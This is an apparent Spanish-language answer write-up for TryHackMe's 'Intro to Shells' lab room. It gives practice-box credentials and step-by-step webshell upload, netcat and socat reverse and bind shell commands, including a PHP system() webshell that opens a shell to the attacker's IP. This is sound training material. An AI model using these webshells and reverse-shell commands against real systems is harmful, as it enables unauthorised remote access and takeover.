### https://tryhackme.com/room/introtoshells
---
## Linux Practice Box

The box attached to this task is an Ubuntu server with a file upload page running on a webserver. This should be used to practice shell uploads on Linux systems. Equally, both socat and netcat are installed on this machine, so please feel free to log in via SSH on port 22 to practice with those directly. The credentials for logging in are:

    Username: shell
    Password: TryH4ckM3!

## Windows Practice Box

This task contains a Windows 2019 Server box running a XAMPP webserver. This can be used to practice shell uploads on Windows. Again, both Socat and Netcat are installed, so feel free to log in over RDP or WinRM to practice with these. The credentials are:

    Username: Administrator
    Password: TryH4ckM3!

To login using RDP:

    xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:MACHINE_IP /u:Administrator /p:'TryH4ckM3!'
---

## Answer the questions below
---
**PREGUNTA**

***Try uploading a webshell to the Linux box, then use the command: nc <LOCAL-IP> <PORT> -e /bin/bash to send a reverse shell back to a waiting listener on your own machine.***
¿Cómo subir y usar una webshell que ejecute `nc` para obtener una reverse shell?

**RESPUESTA**

1. Listener: `nc -lvnp <PUERTO>`
2. Webshell PHP:

   ```php
   <?php system("nc <TU-IP> <PUERTO> -e /bin/bash"); ?>
   ```
3. Subir archivo al servidor (usar extensiones alternativas si hay filtro).
4. Ejecutar accediendo a la URL.
5. Estabilizar shell:

   ```bash
   python3 -c 'import pty; pty.spawn("/bin/bash")'
   export TERM=xterm
   ```

   Luego `stty raw -echo; fg` y `reset`.
---
---
**PREGUNTA**

Navigate to /usr/share/webshells/php/php-reverse-shell.php in Kali and change the IP and port to match your tun0 IP with a custom port. Set up a netcat listener, then upload and activate the shell.

**RESPUESTA**

1. Copiar y editar:

   ```bash
   cd /usr/share/webshells/php/
   cp php-reverse-shell.php shell.php
   nano shell.php
   ```

   Cambiar `$ip` por la IP de `tun0` y `$port` por un puerto libre.
2. Listener:

   ```bash
   nc -lvnp <PUERTO>
   ```
3. Subir `shell.php` al servidor.
4. Ejecutar visitando su URL para iniciar la conexión inversa.
5. Estabilizar shell con `python3 -c 'import pty; pty.spawn("/bin/bash")'`, luego `export TERM=xterm`, `stty raw -echo; fg` y `reset`.
---
---
**PREGUNTA**

Log into the Linux machine over SSH using the credentials in task 14. Use the techniques in Task 8 to experiment with bind and reverse netcat shells.

**RESPUESTA**

1. **Acceso SSH a la máquina Linux**

```bash
ssh shell@<IP_DEL_OBJETIVO>
# Password: TryH4ckM3!
```

Confirma conexión y acceso a shell.

---

2. **Bind shell con netcat en Linux (listener en la víctima):**

En la máquina víctima (Ubuntu):

```bash
mkfifo /tmp/f; nc -lvnp 4444 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```

En la máquina atacante (local):

```bash
nc <IP_VICTIMA> 4444
```

Explicación: la víctima escucha en el puerto 4444, cuando el atacante se conecta, recibe una shell.

---

3. **Reverse shell con netcat en Linux (conexión desde la víctima al atacante):**

En la máquina atacante (local), escucha:

```bash
nc -lvnp 5555
```

En la máquina víctima (Ubuntu):

```bash
mkfifo /tmp/f; nc <IP_ATACANTE> 5555 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```

Explicación: la víctima se conecta hacia el atacante en el puerto 5555 y envía la shell.

---

4. **Prueba básica de bind shell con `nc -e` (si netcat soporta `-e`):**

En víctima:

```bash
nc -lvnp 4444 -e /bin/bash
```

En atacante:

```bash
nc <IP_VICTIMA> 4444
```

---

5. **Prueba básica de reverse shell con `nc -e` (si netcat soporta `-e`):**

En atacante (escucha):

```bash
nc -lvnp 5555
```

En víctima:

```bash
nc <IP_ATACANTE> 5555 -e /bin/bash
```

---

6. **Validación**

* Cambiar `<IP_VICTIMA>` por la IP real del Ubuntu.
* Cambiar `<IP_ATACANTE>` por la IP desde donde escuchas (tu Kali o máquina local).
* Usar puertos sin bloqueo (ejemplo 4444, 5555).
* Verificar que no haya firewall que bloquee puertos.

---

7. **Sugerencia de uso en práctica**

* Abre dos terminales en tu máquina atacante.
* En una terminal, inicia listener para reverse shell.
* En la otra, conéctate SSH a víctima y ejecuta el comando reverse shell.
* Repite con bind shell.

---

***Eso cubre lo necesario para practicar las técnicas netcat bind y reverse shells en la Ubuntu 18.04 según la consigna y los ejemplos dados.***

---
---
**PREGUNTA**

Practice reverse and bind shells using Socat on the Linux machine. Try both the normal and special techniques.

**RESPUESTA**

**Socat Reverse y Bind Shells en Linux**

---

### Requisitos

* `socat` instalado en ambas máquinas (víctima y atacante).
* IP y puertos abiertos para conexiones TCP.

---

### 1. **Bind Shell con Socat (victima escucha)**

En máquina víctima (Linux objetivo):

```bash
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

* Escucha en puerto 4444.
* Por cada conexión, ejecuta `/bin/bash` con pseudo-terminal (`pty`), salida de error (`stderr`), sesión propia (`setsid`), y manejo de señales (`sigint`).
* `fork` para múltiples conexiones.

En máquina atacante (local):

```bash
nc <IP_VICTIMA> 4444
```

---

### 2. **Reverse Shell con Socat (victima conecta al atacante)**

En máquina atacante (local), escuchar:

```bash
socat -d -d TCP-LISTEN:5555,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

* Igual que bind shell, escucha en puerto 5555.

En máquina víctima (Linux objetivo), conectar:

```bash
socat TCP:<IP_ATACANTE>:5555 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```
---

### 3. **Explicación de flags socat**

* `TCP-LISTEN:<port>`: escucha conexiones TCP en puerto.
* `reuseaddr`: permite reusar puerto sin espera.
* `fork`: crea proceso hijo para cada conexión.
* `EXEC:/bin/bash`: ejecuta shell.
* `pty`: asigna pseudo-terminal para shell interactiva.
* `stderr`: conecta salida de errores.
* `setsid`: ejecuta en nueva sesión.
* `sigint`: permite enviar señal CTRL-C.
* `sane`: configura terminal en modo saneable.

---

### 4. **Notas**

* Usar puertos libres y no bloqueados.
* Asegurar que firewall permite conexiones.
* Socat genera shells más estables y completas que netcat.
* Estabilizar shell no suele ser necesario si se usa `pty`.

---

### 5. **Ejemplo completo bind shell**

Víctima:

```bash
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

Atacante:

```bash
nc 10.201.17.102 4444
```

---

### 6. **Ejemplo completo reverse shell**

Atacante:

```bash
socat -d -d TCP-LISTEN:5555,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

Víctima:

```bash
socat TCP:10.2.2.22:5555 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```


---
---

Look through Payloads all the Things and try some of the other reverse shell techniques. Try to analyse them and see why they work.



Switch to the Windows VM. Try uploading and activating the php-reverse-shell. Does this work?

Upload a webshell on the Windows target and try to obtain a reverse shell using Powershell.

The webserver is running with SYSTEM privileges. Create a new user and add it to the "administrators" group, then login over RDP or WinRM.

Experiment using socat and netcat to obtain reverse and bind shells on the Windows Target.

Create a 64bit Windows Meterpreter shell using msfvenom and upload it to the Windows Target. Activate the shell and catch it with multi/handler. Experiment with the features of this shell.

Create both staged and stageless meterpreter shells for either target. Upload and manually activate them, catching the shell with netcat -- does this work?
